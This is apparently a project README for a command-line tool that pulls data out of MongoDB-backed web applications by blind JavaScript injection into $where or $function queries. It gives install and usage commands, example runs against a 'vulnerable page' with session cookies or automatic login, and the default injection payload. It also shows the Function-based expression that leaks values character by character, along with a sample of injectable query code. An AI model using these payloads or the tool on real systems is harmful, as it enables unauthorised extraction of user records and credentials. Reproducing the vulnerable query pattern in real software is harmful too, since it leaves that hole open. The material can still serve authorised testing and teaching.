# MongoDB JS Injection CLI
**Interactive JS injection into MongoDB.**

This scripts allows you to easily list existing variables and print their values using blind JS injection (the only required output from the victim is some kind of true/false - by default it is error/no error).

![Injection CLI Showcase](showcase.gif)

## Installation
To install simply run:

```console
$ git clone https://github.com/brun0ne/mongodb-js-injection-cli
$ pip install -r requirements.txt
```

## Usage
```console
$ python3 mongo-injection-cli.py --help
usage: mongo-injection-cli.py [-h] [--login LOGIN] [--headers HEADERS] [--template TEMPLATE] [--field FIELD] [--method METHOD] [--error ERROR] url

CLI for JS injection into MongoDB

positional arguments:
  url                  ex: http://example.com/vulnerable/page

options:
  -h, --help           show this help message and exit
  --login LOGIN        authenticate before doing anything
                       ex: login:password@http://example.com/login-page
  --headers HEADERS    JSON file containing HTTP headers
  --template TEMPLATE  injection template
                       default: admin' && {test} ? Math : throwerrorplease ||'
  --field FIELD        parameter to inject to, default: username
  --method METHOD      HTTP method, default: GET
  --error ERROR        string for detecting when injected check returned false
                       default: Internal Server Error
```

## Examples
Default settings and provided **headers.json** file (put your session cookies there if needed):

```console
$ python3 mongo-injection-cli.py --headers headers.json http://example.com/vulnerable-page
```

Using **automatic login** with session (you probably have to edit the script to make it work):

```console
$ python3 mongo-injection-cli.py --login user:password@example.com/login http://example.com/vulnerable-page
```

Different **injection template**, **HTTP Method** and **vulnerable parameter**:

```console
$ python3 mongo-injection-cli.py --headers headers.json --method POST --field login --template <your template containing {test}> http://example.com/vulnerable-page
```
## How it works
JavaScript injection is possible when app using MongoDB insecurely uses [$where](https://www.mongodb.com/docs/manual/reference/operator/query/where/) or [$function](https://www.mongodb.com/docs/manual/reference/operator/aggregation/function/).

Vulnerable code might look similar to this:
```js
const query = { $where: `this.username === '${username}' && this.password === '${passToTest}'` };
```

This script (by default) injects into `username` parameter:
```js
admin' && ({test} ? Math : throwerrorplease) ||'
```

inserting into `{test}` the JavaScript expression we want to get **true/false** out of.

If it returned **true** we get a working page. **If not**, it tries to get `throwerrorplease` which doesn't exist, and throws some kind of **error we can detect**.

This way, if we test for:
```js
(Function("return (function(){ /* our code */ }).bind(this)()").call(this)).toString().startsWith("/* what we got so far + new character */")
```

we can extract values character by character, preserving `this` containing fields returned by the database (`this.username`, etc).

This script also has a built-in, prepended function `getAll(<object>)` which **returns a list of every method and attribute of the provided object** (also the inherited ones).


